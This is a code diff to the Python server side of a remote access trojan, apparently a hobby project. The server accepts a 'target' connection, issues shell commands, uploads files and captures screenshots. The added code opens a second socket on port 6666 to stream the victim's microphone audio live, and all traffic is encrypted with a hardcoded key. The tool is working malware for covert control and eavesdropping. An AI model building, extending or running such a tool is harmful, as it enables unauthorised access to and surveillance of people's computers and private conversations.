@@ -23,6 +23,10 @@ import threading
 psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
 cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
 
+# Pre-create variable for audio
+global stream_flag, audio_thread
+stream_flag = {'on': False}
+audio_thread = None
 
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
@@ -134,14 +138,17 @@ def stream_audio_from_target(flag):
     stream = p.open(format=FORMAT, channels=CHANNELS,
                     rate=RATE, output=True, frames_per_buffer=CHUNK)
 
+    audio_target.settimeout(1.0)  # Use the actual connection socket
+
     try:
         while flag['on']:
-            data = target.recv(CHUNK)
-            if not data:
-                break
-            stream.write(data)
-    except:
-        pass
+            try:
+                data = audio_target.recv(CHUNK)
+                if not data:
+                    break
+                stream.write(data)
+            except audio_target.timeout:
+                continue
     finally:
         stream.stop_stream()
         stream.close()
@@ -150,6 +157,8 @@ def stream_audio_from_target(flag):
 
 # Function for the main communication loop with the target
 def target_communication():
+    global stream_flag
+    global audio_thread
     while True:
         # Prompt the user for a command to send to the target.
         command = input('* Shell~%s: ' % str(ip))
@@ -171,13 +180,14 @@ def target_communication():
             # If the user enters 'upload', initiate the upload of a file to the target.
             upload_file(command[7:])
         elif command == 'listening_start':
-            stream_flag = {'on': False}
             if not stream_flag['on']:
                 stream_flag['on'] = True
-                audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
-                audio_thread.start()
-            result = reliable_recv()
-            print(result)
+                if audio_thread is not None and audio_thread.is_alive(): # Safe to check if it's running
+                    audio_thread.join()
+                else:
+                    audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
+                    audio_thread.daemon = True
+                    audio_thread.start()
         elif command == 'listening_stop':
             stream_flag['on'] = False
         elif command == 'screenshot':
@@ -208,10 +218,11 @@ def target_communication():
 
 # Create a socket for the server
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+audio = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
-sock.bind(('192.168.210.143', 5555))
-
+sock.bind(('192.168.56.101', 5555))
+audio.bind(('192.168.56.101', 6666))
 # Start listening for incoming connections (maximum 5 concurrent connections).
 print('[+] Listening For The Incoming Connections')
 sock.listen(5)
@@ -220,5 +231,11 @@ sock.listen(5)
 target, ip = sock.accept()
 print('[+] Target Connected From: ' + str(ip))
 
+# Accept incoming connection from the target audio and obtain the target's IP address.
+print('[+] Waiting for audio stream...')
+audio.listen(5)
+
+audio_target, audio_ip = audio.accept()
+print("[+] Audio socket connected:", audio_ip)
 # Start the main communication loop with the target by calling target_communication.
 target_communication()
